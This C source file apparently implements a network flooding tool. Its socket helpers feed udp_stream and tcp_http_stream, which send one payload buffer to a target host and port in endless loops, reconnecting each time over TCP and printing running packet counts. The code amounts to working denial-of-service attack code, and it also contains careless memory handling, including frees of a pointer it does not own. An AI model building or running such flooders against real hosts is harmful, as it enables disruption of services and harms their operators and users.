#include "networking.h"


int nk_sock_init(nk_socket_type* type)
{
	int s;
	if ((s = socket((int)type->inet, (enum __socket_type)type->proto, 0)) == -1)
	{
        perror("Socket creation failed! : \n");
		exit(-1);
	}

	type->server->sin_family = type->inet;
	type->server->sin_port   = htons(type->port);
	type->server->sin_addr.s_addr = inet_addr(*(type->host));

	memset(&(type->server->sin_zero), '\0', sizeof(type->server->sin_zero));

	return s;
}

int nk_send_pkt(int s, nk_socket_type* type, char** buffer)
{
	switch (type->proto)
	{
	case SOCK_STREAM:
		if ( connect(s, (struct sockaddr *)(type->server), sizeof(*(type->server))) != 0 )
		{
			perror("ERROR CONNECTING TO HOST");
			return NK_ERROR;
		}
		if ( send(s, *buffer, strlen(*buffer), NK_FLAGS_NONE) == -1 )
			return NK_ERROR;
		
		break;
	case SOCK_DGRAM:
		if ( sendto(s, *buffer, strlen(*buffer), NK_FLAGS_NONE, (struct sockaddr*) type->server, sizeof(*(type->server))) == -1 )
			return NK_ERROR;

		break;
	default:
		perror("Protocol not supported.");
		return NK_ERROR;
	}

	return NK_OK;
}

void udp_stream(const char** host, int port, char** payload_buffer)
{
	nk_socket_type __sock;
	struct sockaddr_in server;
	
	__sock.host   = host;
	__sock.port   = port;
	__sock.inet   = AF_INET;
	__sock.proto  = SOCK_DGRAM;
	__sock.server = &server;

	printf("%s\n", *host);

	int cycle = 0;
	int sock = nk_sock_init(&__sock);

	while (true)
	{
		if (nk_send_pkt(sock, &__sock, payload_buffer) != NK_OK)
		{
			printf("Error sending packet\n");
			free(payload_buffer);
			return;
		} cycle++;

		if (cycle % 1000 == 0)
            printf("Sent: %d to %s\n", cycle, *host);
	}

	free(payload_buffer);
}

void tcp_http_stream(const char** host, int port, char** payload_buffer)
{
	nk_socket_type __sock;
	struct sockaddr_in server;
	
	__sock.host   = host;
	__sock.port   = port;
	__sock.inet   = AF_INET;
	__sock.proto  = SOCK_STREAM;
	__sock.server = &server;

	int cycle = 0;

	while (true)
	{
		int sock = nk_sock_init(&__sock);

		if (nk_send_pkt(sock, &__sock, payload_buffer) != NK_OK)
		{
			printf("Error sending packet\n");
			free(payload_buffer);
			return;
		} cycle++;

		printf("Sent: %d to %s\n", cycle, *host);

		close(sock);
	}

	free(payload_buffer);
}

